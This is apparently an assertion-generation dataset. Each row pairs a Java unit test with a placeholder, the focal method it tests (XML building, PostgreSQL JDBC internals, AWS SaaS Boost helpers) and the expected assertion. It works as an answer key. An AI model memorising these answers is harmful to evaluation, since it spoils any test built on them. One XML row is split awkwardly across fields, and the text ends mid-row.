"testCData() { XmlElement x = XmlElement .parse(""<a><![CDATA[\n"" + ""Within this Character Data block I can\n"" + ""use double dashes as much as I want (along with <, &, ', and "")\n"" + ""*and* %MyParamEntity; will be expanded to the text\n"" + """"Has been expanded"" ... however, I can't use\n"" + ""the CEND sequence. If I need to use CEND I must escape one of the\n"" + ""brackets or the greater-than sign using concatenated CDATA sections.\n"" + ""]]></a>""); String s = x.content(); ""<AssertPlaceHolder>""; }
content() { return this.content; }"	"assertTrue(s.contains(""as I want (along with <, &, '""))"
"testPreserveWhitespace() { XmlElement x = XmlElement.parse(""<a> hi </a>"", false); ""<AssertPlaceHolder>""; }
content() { return this.content; }"	"assertEquals("" hi "", x.content())"
"testSkipWhitespace() { XmlElement x = XmlElement.parse(""<a> \r\t\nhi</a>""); ""<AssertPlaceHolder>""; }
content() { return this.content; }"	"assertEquals(""hi"", x.content())"
"test() { String xml = Xml // .create(""CompleteMultipartUpload"") // .a(""xmlns"", ""http://s3.amazonaws.com/doc/2006-03-01/"") // .a(""weird"", ""&<>'"""") // .e(""Part"") // .e(""ETag"").content(""1234&"") // .up() // .e(""PartNumber"").content(""1"") // .toString(); ""<AssertPlaceHolder>"";&lt;&gt;&apos;&quot;"" xmlns=""http://s3.amazonaws.com/doc/2006-03-01/"">\n"" + ""  <Part>\n"" + ""    <ETag>1234&amp;</ETag>\n"" + ""    <PartNumber>1</PartNumber>\n"" + ""  </Part>\n"" + ""</CompleteMultipartUpload>"", xml); }
toString() { Xml xml = this; while (xml.parent != null) { xml = xml.parent; } return xml.toString(""""); }"	"assertEquals(""<?xml version=""1.0"" encoding=""UTF-8""?>\n"" + ""<CompleteMultipartUpload weird=""&amp"
"testPrelude() { ""<AssertPlaceHolder>""; }
toString() { Xml xml = this; while (xml.parent != null) { xml = xml.parent; } return xml.toString(""""); }"	"assertEquals(""<?xml version=""1.0"" encoding=""UTF-8""?>\n"" + ""<root>\n"" + ""</root>"", Xml.create(""root"").toString())"
"testNoPrelude() { ""<AssertPlaceHolder>""; }
toString() { Xml xml = this; while (xml.parent != null) { xml = xml.parent; } return xml.toString(""""); }"	"assertEquals(""<root>\n"" + ""</root>"", Xml.create(""root"").excludePrelude().toString())"
"testNoPreludeOnChild() { ""<AssertPlaceHolder>""; }
toString() { Xml xml = this; while (xml.parent != null) { xml = xml.parent; } return xml.toString(""""); }"	"assertEquals(""<root>\n  <thing></thing>\n"" + ""</root>"", Xml.create(""root"").element(""thing"").content("""").excludePrelude().toString())"
"testLegalWhitespace() { ""<AssertPlaceHolder>""; }
toString() { Xml xml = this; while (xml.parent != null) { xml = xml.parent; } return xml.toString(""""); }"	"assertEquals( ""<root>\t\n\rabc</root>"", Xml.create(""root"").excludePrelude().content(""\t\n\rabc"").toString())"
"PSQLException { CommandCompleteParser expected = new CommandCompleteParser(); CommandCompleteParser actual = new CommandCompleteParser(); expected.set(oid, rows); actual.parse(input); Assert.""<AssertPlaceHolder>""; }
parse(String status) throws PSQLException { // Assumption: command neither starts nor ends with a digit if (!Parser.isDigitAt(status, status.length() - 1)) { set(0, 0); return; }  // Scan backwards, while searching for a maximum of two number groups //   COMMAND OID ROWS //   COMMAND ROWS long oid = 0; long rows = 0; try { int lastSpace = status.lastIndexOf(' '); // Status ends with a digit => it is ROWS if (Parser.isDigitAt(status, lastSpace + 1)) { rows = Parser.parseLong(status, lastSpace + 1, status.length());  if (Parser.isDigitAt(status, lastSpace - 1)) { int penultimateSpace = status.lastIndexOf(' ', lastSpace - 1); if (Parser.isDigitAt(status, penultimateSpace + 1)) { oid = Parser.parseLong(status, penultimateSpace + 1, lastSpace); } } } } catch (NumberFormatException e) { // This should only occur if the oid or rows are out of 0..Long.MAX_VALUE range throw new PSQLException( GT.tr(""Unable to parse the count in command completion tag: {0}."", status), PSQLState.CONNECTION_FAILURE, e); } set(oid, rows); }"	assertEquals(input, expected, actual)
"testGettingFetchSizeForNotExistingQuery() { String expectedQuery = ""test-query""; boolean adaptiveFetch = true;  int resultSize = adaptiveFetchCache .getFetchSizeForQuery(adaptiveFetch, new MockUpQuery(expectedQuery));  ""<AssertPlaceHolder>""; }
getFetchSizeForQuery(boolean adaptiveFetch, @NonNull Query query) { if (adaptiveFetch && maximumResultBufferSize != -1) { String sql = query.getNativeSql().trim(); AdaptiveFetchCacheEntry adaptiveFetchCacheEntry = adaptiveFetchInfoMap.get(sql); if (adaptiveFetchCacheEntry != null) { return adaptiveFetchCacheEntry.getSize(); } } return -1; }"	assertEquals(-1, resultSize)
"testGettingFetchSizeForNotExistingQueryIfAdaptiveFetchFalse() { String expectedQuery = ""test-query""; boolean adaptiveFetch = false;  int resultSize = adaptiveFetchCache .getFetchSizeForQuery(adaptiveFetch, new MockUpQuery(expectedQuery));  ""<AssertPlaceHolder>""; }
getFetchSizeForQuery(boolean adaptiveFetch, @NonNull Query query) { if (adaptiveFetch && maximumResultBufferSize != -1) { String sql = query.getNativeSql().trim(); AdaptiveFetchCacheEntry adaptiveFetchCacheEntry = adaptiveFetchInfoMap.get(sql); if (adaptiveFetchCacheEntry != null) { return adaptiveFetchCacheEntry.getSize(); } } return -1; }"	assertEquals(-1, resultSize)
"Exception { LogSequenceNumber result = LogSequenceNumber.valueOf(""16/3002D50""); ""<AssertPlaceHolder>""; }
asLong() { return value; }"	"assertThat(""64-bit number use in replication protocol, "" + ""that why we should can convert string represent LSN to long"", result.asLong(), equalTo(94539623760L) )"
"Exception { LogSequenceNumber result = LogSequenceNumber.valueOf(94539623760L);  ""<AssertPlaceHolder>""; }
asString() { ByteBuffer buf = ByteBuffer.allocate(8); buf.putLong(value); buf.position(0);  int logicalXlog = buf.getInt(); int segment = buf.getInt(); return String.format(""%X/%X"", logicalXlog, segment); }"	"assertThat(""64-bit number use in replication protocol, "" + ""but more readable standard format use in logs where each 8-bit print in hex form via slash"", result.asString(), equalTo(""16/3002D50"") )"
"Exception { LogSequenceNumber result = LogSequenceNumber.valueOf(366383352L);  ""<AssertPlaceHolder>""; }
asString() { ByteBuffer buf = ByteBuffer.allocate(8); buf.putLong(value); buf.position(0);  int logicalXlog = buf.getInt(); int segment = buf.getInt(); return String.format(""%X/%X"", logicalXlog, segment); }"	"assertThat(""64-bit number use in replication protocol, "" + ""but more readable standard format use in logs where each 8-bit print in hex form via slash"", result.asString(), equalTo(""0/15D690F8"") )"
"Exception { LogSequenceNumber first = LogSequenceNumber.valueOf(""0/15D690F8""); LogSequenceNumber second = LogSequenceNumber.valueOf(""0/15D68C50"");  ""<AssertPlaceHolder>""; }
hashCode() { return (int) (value ^ (value >>> 32)); }"	assertThat(first.hashCode(), not(equalTo(second.hashCode())))
"Exception { LogSequenceNumber first = LogSequenceNumber.valueOf(""0/15D690F8""); LogSequenceNumber second = LogSequenceNumber.valueOf(""0/15D690F8"");  ""<AssertPlaceHolder>""; }
hashCode() { return (int) (value ^ (value >>> 32)); }"	assertThat(first.hashCode(), equalTo(second.hashCode()))
"testGetRuntimeVersion() { String currentVersion = System.getProperty(""java.version""); String msg = ""java.version = "" + currentVersion + "", JavaVersion.getRuntimeVersion() = "" + JavaVersion.getRuntimeVersion(); System.out.println(msg); if (currentVersion.startsWith(""1.8"")) { Assert.""<AssertPlaceHolder>""; } }
getRuntimeVersion() { return RUNTIME_VERSION; }"	assertEquals(msg, JavaVersion.v1_8, JavaVersion.getRuntimeVersion())
"Exception { Driver driver = dataSourceFactory.createDriver(null); Assert.""<AssertPlaceHolder>""; }
createDriver(Properties props) throws SQLException { if (props != null && !props.isEmpty()) { throw new PSQLException(GT.tr(""Unsupported properties: {0}"", props.stringPropertyNames()), PSQLState.INVALID_PARAMETER_VALUE); } return new org.postgresql.Driver(); }"	assertTrue(driver instanceof org.postgresql.Driver)
"Exception { DataSource dataSource = dataSourceFactory.createDataSource(null); Assert.""<AssertPlaceHolder>""; }
createDataSource(Properties props) throws SQLException { props = new SingleUseProperties(props); if (props.containsKey(JDBC_INITIAL_POOL_SIZE) || props.containsKey(JDBC_MIN_POOL_SIZE) || props.containsKey(JDBC_MAX_POOL_SIZE) || props.containsKey(JDBC_MAX_IDLE_TIME) || props.containsKey(JDBC_MAX_STATEMENTS)) { return createPoolingDataSource(props); } else { return createSimpleDataSource(props); } }"	assertNotNull(dataSource)
"Exception { ConnectionPoolDataSource dataSource = dataSourceFactory.createConnectionPoolDataSource(null); Assert.""<AssertPlaceHolder>""; }
createConnectionPoolDataSource(Properties props) throws SQLException { props = new SingleUseProperties(props); ConnectionPool dataSource = new ConnectionPool(); configureBaseDataSource(dataSource, props); return dataSource; }"	assertNotNull(dataSource)
"Exception { XADataSource dataSource = dataSourceFactory.createXADataSource(null); Assert.""<AssertPlaceHolder>""; }
createXADataSource(Properties props) throws SQLException { props = new SingleUseProperties(props); PGXADataSource dataSource = new PGXADataSource(); configureBaseDataSource(dataSource, props); return dataSource; }"	assertNotNull(dataSource)
"testReportsLengthCorrectly() { ""<AssertPlaceHolder>""; }
getLength() { return length; }"	"assertEquals(""Incorrect length reported"", 4, writer.getLength())"
"IOException { writer.writeTo(target(targetStream)); byte[] written = targetStream.toByteArray(); ""<AssertPlaceHolder>""; }
writeTo(ByteStreamTarget target) throws IOException { // this _does_ involve some copying to a temporary buffer, but that's unavoidable // as OutputStream itself only accepts single bytes or heap allocated byte arrays WritableByteChannel c = Channels.newChannel(target.getOutputStream()); try { c.write(buf); } finally { c.close(); } }"	"assertArrayEquals(""Incorrect data written to target stream"", data, written)"
"IOException { final IOException e = new IOException(""oh no""); OutputStream errorStream = new OutputStream() { @Override public void write(int b) throws IOException { throw e; } }; try { writer.writeTo(target(errorStream)); fail(""No exception thrown""); } catch (IOException caught) { ""<AssertPlaceHolder>""; } }
writeTo(ByteStreamTarget target) throws IOException { // this _does_ involve some copying to a temporary buffer, but that's unavoidable // as OutputStream itself only accepts single bytes or heap allocated byte arrays WritableByteChannel c = Channels.newChannel(target.getOutputStream()); try { c.write(buf); } finally { c.close(); } }"	"assertEquals(""Exception was thrown that wasn't the expected one"", caught, e)"
"Exception { HostSpec hostSpec = new HostSpec(""localhost"", 5432); ""<AssertPlaceHolder>""; }
shouldResolve() { String socksProxy = System.getProperty(""socksProxyHost""); if (socksProxy == null || socksProxy.trim().isEmpty()) { return true; } return matchesNonProxyHosts(); }"	assertTrue(hostSpec.shouldResolve())
"Exception { System.setProperty(""socksProxyHost"", """"); HostSpec hostSpec = new HostSpec(""localhost"", 5432); ""<AssertPlaceHolder>""; }
shouldResolve() { String socksProxy = System.getProperty(""socksProxyHost""); if (socksProxy == null || socksProxy.trim().isEmpty()) { return true; } return matchesNonProxyHosts(); }"	assertTrue(hostSpec.shouldResolve())
"Exception { System.setProperty(""socksProxyHost"", "" ""); HostSpec hostSpec = new HostSpec(""localhost"", 5432); ""<AssertPlaceHolder>""; }
shouldResolve() { String socksProxy = System.getProperty(""socksProxyHost""); if (socksProxy == null || socksProxy.trim().isEmpty()) { return true; } return matchesNonProxyHosts(); }"	assertTrue(hostSpec.shouldResolve())
"Exception { System.setProperty(""socksProxyHost"", ""fake-socks-proxy""); HostSpec hostSpec = new HostSpec(""example.com"", 5432); ""<AssertPlaceHolder>""; }
shouldResolve() { String socksProxy = System.getProperty(""socksProxyHost""); if (socksProxy == null || socksProxy.trim().isEmpty()) { return true; } return matchesNonProxyHosts(); }"	assertFalse(hostSpec.shouldResolve())
"Exception { System.setProperty(""socksProxyHost"", ""fake-socks-proxy""); HostSpec hostSpec = new HostSpec(""localhost"", 5432); ""<AssertPlaceHolder>""; }
shouldResolve() { String socksProxy = System.getProperty(""socksProxyHost""); if (socksProxy == null || socksProxy.trim().isEmpty()) { return true; } return matchesNonProxyHosts(); }"	assertTrue(hostSpec.shouldResolve())
"Exception { System.setProperty(""socksProxyHost"", ""fake-socks-proxy""); System.setProperty(""socksNonProxyHosts"", ""example.com""); HostSpec hostSpec = new HostSpec(""example.com"", 5432); ""<AssertPlaceHolder>""; }
shouldResolve() { String socksProxy = System.getProperty(""socksProxyHost""); if (socksProxy == null || socksProxy.trim().isEmpty()) { return true; } return matchesNonProxyHosts(); }"	assertTrue(hostSpec.shouldResolve())
"Exception { System.setProperty(""socksProxyHost"", ""fake-socks-proxy""); System.setProperty(""socksNonProxyHosts"", ""example.com|localhost""); HostSpec hostSpec = new HostSpec(""example.com"", 5432); ""<AssertPlaceHolder>""; }
shouldResolve() { String socksProxy = System.getProperty(""socksProxyHost""); if (socksProxy == null || socksProxy.trim().isEmpty()) { return true; } return matchesNonProxyHosts(); }"	assertTrue(hostSpec.shouldResolve())
"Exception { System.setProperty(""socksProxyHost"", ""fake-socks-proxy""); System.setProperty(""socksNonProxyHosts"", ""example.com|localhost""); HostSpec hostSpec = new HostSpec(""example.org"", 5432); ""<AssertPlaceHolder>""; }
shouldResolve() { String socksProxy = System.getProperty(""socksProxyHost""); if (socksProxy == null || socksProxy.trim().isEmpty()) { return true; } return matchesNonProxyHosts(); }"	assertFalse(hostSpec.shouldResolve())
"Exception { HostSpec hostSpec = new HostSpec(""example.org"", 5432); ""<AssertPlaceHolder>""; }
getLocalSocketAddress() { return localSocketAddress; }"	assertNull(hostSpec.getLocalSocketAddress())
"Exception { HostSpec hostSpec = new HostSpec(""example.org"", 5432, ""foo""); ""<AssertPlaceHolder>""; }
getLocalSocketAddress() { return localSocketAddress; }"	"assertEquals(""foo"", hostSpec.getLocalSocketAddress())"
"testGetMaxResultBufferValue() { try { long result = PGPropertyMaxResultBufferParser.parseProperty(valueToParse); Assert.""<AssertPlaceHolder>""; } catch (PSQLException e) { //shouldn't occur fail(); } }
parseProperty(@Nullable String value) throws PSQLException { long result = -1; //noinspection StatementWithEmptyBody if (value == null) { // default branch } else if (checkIfValueContainsPercent(value)) { result = parseBytePercentValue(value); } else if (!value.isEmpty()) { result = parseByteValue(value); } result = adjustResultSize(result); return result; }"	assertEquals(expectedResult, result)
"tokenize() { PGtokenizer pGtokenizer = new PGtokenizer(""1,2EC1830300027,1,,"",','); ""<AssertPlaceHolder>""; }
getSize() { return tokens.size(); }"	assertEquals(5,pGtokenizer.getSize())
"tokenize2() { PGtokenizer pGtokenizer = new PGtokenizer("",,d,""f(10"",""(mime,pdf,pdf)"",test,2018-10-11,1010"", ','); ""<AssertPlaceHolder>""; }
getSize() { return tokens.size(); }"	assertEquals(8,pGtokenizer.getSize())
"tokenize3() { PGtokenizer pGtokenizer = new PGtokenizer("",,d,""f)10"",""(mime,pdf,pdf)"",test,2018-10-11,1010"", ','); ""<AssertPlaceHolder>""; }
getSize() { return tokens.size(); }"	assertEquals(8,pGtokenizer.getSize())
"tokenize4() { PGtokenizer pGtokenizer = new PGtokenizer("",,d,""f()10"",""(mime,pdf,pdf)"",test,2018-10-11,1010"", ','); ""<AssertPlaceHolder>""; }
getSize() { return tokens.size(); }"	assertEquals(8,pGtokenizer.getSize())
"removePara() { String string = PGtokenizer.removePara(""(1,2EC1830300027,1,,)""); Assert.""<AssertPlaceHolder>""; }
removePara() { remove(""("", "")""); }"	"assertEquals(""1,2EC1830300027,1,,"", string)"
"removeBox() { ""<AssertPlaceHolder>""; }
removeBox() { remove(""["", ""]""); }"	assertTrue(true)
"removeAngle() { ""<AssertPlaceHolder>""; }
removeAngle() { remove(""<"", "">""); }"	assertTrue(true)
"removeCurlyBrace() { ""<AssertPlaceHolder>""; }
removeCurlyBrace() { remove(""{"", ""}""); }"	assertTrue(true)
"Exception { final int blockSize = 8 * 1024; final int dataSize = blockSize + 57; final byte[] data = new byte[dataSize]; final byte[] buffer = new byte[blockSize];  InputStreamReader isr = new InputStreamReader(new ByteArrayInputStream(data), ""UTF-8""); ReaderInputStream r = new ReaderInputStream(isr, blockSize);  int total = 0;  total += r.read(buffer, 0, blockSize); total += r.read(buffer, 0, blockSize);  ""<AssertPlaceHolder>""; }
read(byte[] b, int off, int len) throws IOException { if (b == null) { throw new NullPointerException(); } else if (off < 0 || len < 0 || len > b.length - off) { throw new IndexOutOfBoundsException(); } else if (len == 0) { return 0; } if (endOfInput && !bbuf.hasRemaining()) { return -1; }  int totalRead = 0; while (len > 0 && !endOfInput) { if (bbuf.hasRemaining()) { int remaining = Math.min(len, bbuf.remaining()); bbuf.get(b, off, remaining); totalRead += remaining; off += remaining; len -= remaining; if (len == 0) { return totalRead; } } advance(); } if (endOfInput && !bbuf.hasRemaining() && totalRead == 0) { return -1; } return totalRead; }"	"assertEquals(""Data not read completely: missing "" + (dataSize - total) + "" bytes"", dataSize, total)"
"testApiGatewayResource_Default() { TokenAuthorizerRequest event = TokenAuthorizerRequest.builder() .methodArn(""arn:aws:execute-api:us-east-1:123456789012:abcdef123/test/GET/request"") .build();  ""<AssertPlaceHolder>""; }
apiGatewayResource(TokenAuthorizerRequest event) { return apiGatewayResource(event, ""*"", ""*""); }"	"assertEquals(""arn:aws:execute-api:us-east-1:123456789012:abcdef123/test/*/*"", ApiGatewayAuthorizer.apiGatewayResource(event))"
"testParseBearerToken() { ""<AssertPlaceHolder>""; }
tokenPayload() { return BEARER_TOKEN_REGEX.split(authorizationToken)[1]; }"	"assertTrue(request.tokenPayload().startsWith(""eyJraWQiOiI1Y2""))"
"testPrincipalId() { ""<AssertPlaceHolder>""; }
getAccountId() { return accountId; }"	"assertEquals(""123456789012"", request.getAccountId())"
"testRegion() { ""<AssertPlaceHolder>""; }
getRegion() { return region; }"	"assertEquals(""us-east-1"", request.getRegion())"
"testApiId() { ""<AssertPlaceHolder>""; }
getApiId() { return apiId; }"	"assertEquals(""abcdef123"", request.getApiId())"
"testStage() { ""<AssertPlaceHolder>""; }
getStage() { return stage; }"	"assertEquals(""test"", request.getStage())"
"testType() { ""<AssertPlaceHolder>""; }
getType() { return type; }"	"assertEquals(""TOKEN"", request.getType())"
"testFilter() { UUID id = UUID.randomUUID(); String tenantId = id.toString().split(""-"")[0]; CloudFormationEvent event = CloudFormationEvent.builder() .stackName(""sb-"" + System.getenv(""SAAS_BOOST_ENV"") + ""-tenant-"" + tenantId + ""-app-foobar-"" + Utils.randomString(12)) .resourceType(""AWS::CloudFormation::Stack"") .resourceStatus(""CREATE_COMPLETE"") .build(); ""<AssertPlaceHolder>""; }
filter(CloudFormationEvent cloudFormationEvent) { return (""AWS::CloudFormation::Stack"".equals(cloudFormationEvent.getResourceType()) && STACK_NAME_PATTERN.matcher(cloudFormationEvent.getStackName()).matches() && EVENTS_OF_INTEREST.contains(cloudFormationEvent.getResourceStatus())); }"	assertTrue(OnboardingAppStackListener.filter(event))
"verifyFactoryCachingForAllBuilders() { AwsClientBuilderFactory factory = AwsClientBuilderFactory.builder().build(); // for each method that returns a builder.. for (Method m : factory.getClass().getMethods()) { // checking if the return type implements AwsSyncClientBuilder if (List.of(m.getReturnType().getInterfaces()).contains(AwsSyncClientBuilder.class)) { try { AwsSyncClientBuilder b = (AwsSyncClientBuilder) m.invoke(factory); // invoking the builder function again should not create a new builder ""<AssertPlaceHolder>""; } catch (Exception e) { throw new RuntimeException(""test failed"", e); } } } }
build() { return new AwsClientBuilderFactory(this); }"	assertEquals(b, m.invoke(factory))
"testUpdateActionsFromPaths_unrecognizedPath() { Set<UpdateAction> expectedActions = EnumSet.noneOf(UpdateAction.class); List<Path> unrecognizedPaths = List.of(Path.of(""abc/unrecognized/path.java"")); Collection<UpdateAction> actualActions = updateWorkflow.getUpdateActionsFromPaths(unrecognizedPaths); ""<AssertPlaceHolder>""; }
getUpdateActionsFromPaths(List<Path> changedPaths) { Set<UpdateAction> actions = EnumSet.noneOf(UpdateAction.class);  /* * Take for example the following list of changed paths: *   client/web/src/App.js *   functions/core-stack-listener/src/... *   services/onboarding-service/src/... *   services/tenant-service/src/... *   services/tenant-service/src/... *   resources/saas-boost.yaml *   resources/saas-boost-svc-tenant.yaml *   resources/custom-resources/app-services-ecr-macro/src/... * * The intention of this algorithm is to pull out the high level SaaS Boost components from the Path, as * represented by the UpdateAction Enum. e.g. CLIENT, FUNCTIONS, SERVICES, CUSTOM_RESOURCES, RESOURCES for * the above example, following these steps *   - for each path *     - traverse through each path component, up to a maximum depth of 2 (optimization, since no component *       pathname is at a depth deeper than two) *       - if we find the resources/ path component and the next component is custom-resources, continue *       - otherwise match the path component against an UpdateAction. if we find a valid one, add it to our *         list taking into account not only the UpdateAction itself (e.g. FUNCTIONS) but also the ""target"" *         of the UpdateAction (e.g. FUNCTIONS -> core-stack-listener) * * So the expected set of UpdateActions resulting from the above example is: *   CLIENT *   FUNCTIONS -> core-stack-listener *   SERVICES -> onboarding-service, tenant-service *   RESOURCES -> saas-boost.yaml, saas-boost-svc-tenant.yaml *   CUSTOM_RESOURCES -> app-services-ecr-macro */ for (Path changedPath : changedPaths) { LOGGER.debug(""processing {}"", changedPath); Path absolutePath = Path.of(workingDir.toString(), changedPath.toString()); if (!absolutePath.toFile().exists()) { LOGGER.debug(""Skipping {} since it doesn't exist"", changedPath); continue; } final int maximumTraversalDepth = 2; for (int i = 0; i < Math.min(changedPath.getNameCount(), maximumTraversalDepth); i++) { UpdateAction pathAction = UpdateAction.fromDirectoryName(changedPath.getName(i).toString()); if (pathAction != null) { // edge case: if this is a resources/custom-resources/.. path, we might be pinging on resources/ //            when we should on custom-resources. so skip if it is LOGGER.debug(""found action {} from path {}"", pathAction, changedPath); if ((i + 1) == changedPath.getNameCount()) { // ""this"" name at `i` resolved to an UpdateAction, but there is no valid target // represented by the next value in the name. this is an invalid changed path: // a directory itself isn't changed, the files underneath is changed LOGGER.error(""Skipping {}, since it's an invalid changed path: expecting a file"", changedPath); break; } String target = changedPath.getName(i + 1).toString(); if (pathAction == UpdateAction.RESOURCES && UpdateAction.fromDirectoryName(target) == UpdateAction.CUSTOM_RESOURCES) { LOGGER.debug(""Skipping RESOURCES for CUSTOM_RESOURCES in {}"", changedPath); continue; } // now add targets if necessary switch (pathAction) { case RESOURCES: { if (target.endsWith("".yaml"")) { LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); pathAction.addTarget(target); } else if (target.endsWith(""keycloak/Dockerfile"")) { LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); pathAction.addTarget(target); } else { LOGGER.debug(""Skipping adding {} to UpdateAction {}"", target, pathAction); } break; } case CLIENT: case CUSTOM_RESOURCES: case FUNCTIONS: case LAYERS: case METERING_BILLING: case SERVICES: { // each of the above actions use update.sh to update. the target here needs to be // a directory, because the update workflow looks underneath the target for the update // script. therefore editing something like layers/ parent pom or metering-billing // parent pom is not something worth updating LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); // absolute against workingDir, rather than against running dir Path targetPath = Path.of(workingDir.toString(), changedPath.subpath(0, i + 2).toString()); if (targetPath.toFile().isDirectory()) { // a non-yaml file (e.g. pom.xml) is not an acceptable target, // since there will be no update path underneath it pathAction.addTarget(target); } break; } default: { // do nothing } } if (pathAction.getTargets().size() > 0 && !actions.contains(pathAction)) { LOGGER.debug(""Adding new action {} from path {}"", pathAction, changedPath); actions.add(pathAction); } break; } } }  return actions; }"	assertEquals(expectedActions, actualActions)
"testUpdateActionsFromPaths_shortPaths() { Set<UpdateAction> expectedActions = EnumSet.noneOf(UpdateAction.class); List<Path> changedPaths = List.of(Path.of(""pom.xml"")); Collection<UpdateAction> actualActions = updateWorkflow.getUpdateActionsFromPaths(changedPaths); ""<AssertPlaceHolder>""; }
getUpdateActionsFromPaths(List<Path> changedPaths) { Set<UpdateAction> actions = EnumSet.noneOf(UpdateAction.class);  /* * Take for example the following list of changed paths: *   client/web/src/App.js *   functions/core-stack-listener/src/... *   services/onboarding-service/src/... *   services/tenant-service/src/... *   services/tenant-service/src/... *   resources/saas-boost.yaml *   resources/saas-boost-svc-tenant.yaml *   resources/custom-resources/app-services-ecr-macro/src/... * * The intention of this algorithm is to pull out the high level SaaS Boost components from the Path, as * represented by the UpdateAction Enum. e.g. CLIENT, FUNCTIONS, SERVICES, CUSTOM_RESOURCES, RESOURCES for * the above example, following these steps *   - for each path *     - traverse through each path component, up to a maximum depth of 2 (optimization, since no component *       pathname is at a depth deeper than two) *       - if we find the resources/ path component and the next component is custom-resources, continue *       - otherwise match the path component against an UpdateAction. if we find a valid one, add it to our *         list taking into account not only the UpdateAction itself (e.g. FUNCTIONS) but also the ""target"" *         of the UpdateAction (e.g. FUNCTIONS -> core-stack-listener) * * So the expected set of UpdateActions resulting from the above example is: *   CLIENT *   FUNCTIONS -> core-stack-listener *   SERVICES -> onboarding-service, tenant-service *   RESOURCES -> saas-boost.yaml, saas-boost-svc-tenant.yaml *   CUSTOM_RESOURCES -> app-services-ecr-macro */ for (Path changedPath : changedPaths) { LOGGER.debug(""processing {}"", changedPath); Path absolutePath = Path.of(workingDir.toString(), changedPath.toString()); if (!absolutePath.toFile().exists()) { LOGGER.debug(""Skipping {} since it doesn't exist"", changedPath); continue; } final int maximumTraversalDepth = 2; for (int i = 0; i < Math.min(changedPath.getNameCount(), maximumTraversalDepth); i++) { UpdateAction pathAction = UpdateAction.fromDirectoryName(changedPath.getName(i).toString()); if (pathAction != null) { // edge case: if this is a resources/custom-resources/.. path, we might be pinging on resources/ //            when we should on custom-resources. so skip if it is LOGGER.debug(""found action {} from path {}"", pathAction, changedPath); if ((i + 1) == changedPath.getNameCount()) { // ""this"" name at `i` resolved to an UpdateAction, but there is no valid target // represented by the next value in the name. this is an invalid changed path: // a directory itself isn't changed, the files underneath is changed LOGGER.error(""Skipping {}, since it's an invalid changed path: expecting a file"", changedPath); break; } String target = changedPath.getName(i + 1).toString(); if (pathAction == UpdateAction.RESOURCES && UpdateAction.fromDirectoryName(target) == UpdateAction.CUSTOM_RESOURCES) { LOGGER.debug(""Skipping RESOURCES for CUSTOM_RESOURCES in {}"", changedPath); continue; } // now add targets if necessary switch (pathAction) { case RESOURCES: { if (target.endsWith("".yaml"")) { LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); pathAction.addTarget(target); } else if (target.endsWith(""keycloak/Dockerfile"")) { LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); pathAction.addTarget(target); } else { LOGGER.debug(""Skipping adding {} to UpdateAction {}"", target, pathAction); } break; } case CLIENT: case CUSTOM_RESOURCES: case FUNCTIONS: case LAYERS: case METERING_BILLING: case SERVICES: { // each of the above actions use update.sh to update. the target here needs to be // a directory, because the update workflow looks underneath the target for the update // script. therefore editing something like layers/ parent pom or metering-billing // parent pom is not something worth updating LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); // absolute against workingDir, rather than against running dir Path targetPath = Path.of(workingDir.toString(), changedPath.subpath(0, i + 2).toString()); if (targetPath.toFile().isDirectory()) { // a non-yaml file (e.g. pom.xml) is not an acceptable target, // since there will be no update path underneath it pathAction.addTarget(target); } break; } default: { // do nothing } } if (pathAction.getTargets().size() > 0 && !actions.contains(pathAction)) { LOGGER.debug(""Adding new action {} from path {}"", pathAction, changedPath); actions.add(pathAction); } break; } } }  return actions; }"	assertEquals(expectedActions, actualActions)
"testUpdateActionsFromPaths_invalidChangedPath() { Set<UpdateAction> expectedActions = EnumSet.noneOf(UpdateAction.class); // just a directory is not a valid changedPath: directories don't change, files do. // getUpdateActionsFromPaths should skip invalid changedPaths List<Path> invalidChangedPaths = List.of( Path.of(""resources""), Path.of(""resources/custom-resources""), Path.of(""services"")); Collection<UpdateAction> actualActions = updateWorkflow.getUpdateActionsFromPaths(invalidChangedPaths); ""<AssertPlaceHolder>""; }
getUpdateActionsFromPaths(List<Path> changedPaths) { Set<UpdateAction> actions = EnumSet.noneOf(UpdateAction.class);  /* * Take for example the following list of changed paths: *   client/web/src/App.js *   functions/core-stack-listener/src/... *   services/onboarding-service/src/... *   services/tenant-service/src/... *   services/tenant-service/src/... *   resources/saas-boost.yaml *   resources/saas-boost-svc-tenant.yaml *   resources/custom-resources/app-services-ecr-macro/src/... * * The intention of this algorithm is to pull out the high level SaaS Boost components from the Path, as * represented by the UpdateAction Enum. e.g. CLIENT, FUNCTIONS, SERVICES, CUSTOM_RESOURCES, RESOURCES for * the above example, following these steps *   - for each path *     - traverse through each path component, up to a maximum depth of 2 (optimization, since no component *       pathname is at a depth deeper than two) *       - if we find the resources/ path component and the next component is custom-resources, continue *       - otherwise match the path component against an UpdateAction. if we find a valid one, add it to our *         list taking into account not only the UpdateAction itself (e.g. FUNCTIONS) but also the ""target"" *         of the UpdateAction (e.g. FUNCTIONS -> core-stack-listener) * * So the expected set of UpdateActions resulting from the above example is: *   CLIENT *   FUNCTIONS -> core-stack-listener *   SERVICES -> onboarding-service, tenant-service *   RESOURCES -> saas-boost.yaml, saas-boost-svc-tenant.yaml *   CUSTOM_RESOURCES -> app-services-ecr-macro */ for (Path changedPath : changedPaths) { LOGGER.debug(""processing {}"", changedPath); Path absolutePath = Path.of(workingDir.toString(), changedPath.toString()); if (!absolutePath.toFile().exists()) { LOGGER.debug(""Skipping {} since it doesn't exist"", changedPath); continue; } final int maximumTraversalDepth = 2; for (int i = 0; i < Math.min(changedPath.getNameCount(), maximumTraversalDepth); i++) { UpdateAction pathAction = UpdateAction.fromDirectoryName(changedPath.getName(i).toString()); if (pathAction != null) { // edge case: if this is a resources/custom-resources/.. path, we might be pinging on resources/ //            when we should on custom-resources. so skip if it is LOGGER.debug(""found action {} from path {}"", pathAction, changedPath); if ((i + 1) == changedPath.getNameCount()) { // ""this"" name at `i` resolved to an UpdateAction, but there is no valid target // represented by the next value in the name. this is an invalid changed path: // a directory itself isn't changed, the files underneath is changed LOGGER.error(""Skipping {}, since it's an invalid changed path: expecting a file"", changedPath); break; } String target = changedPath.getName(i + 1).toString(); if (pathAction == UpdateAction.RESOURCES && UpdateAction.fromDirectoryName(target) == UpdateAction.CUSTOM_RESOURCES) { LOGGER.debug(""Skipping 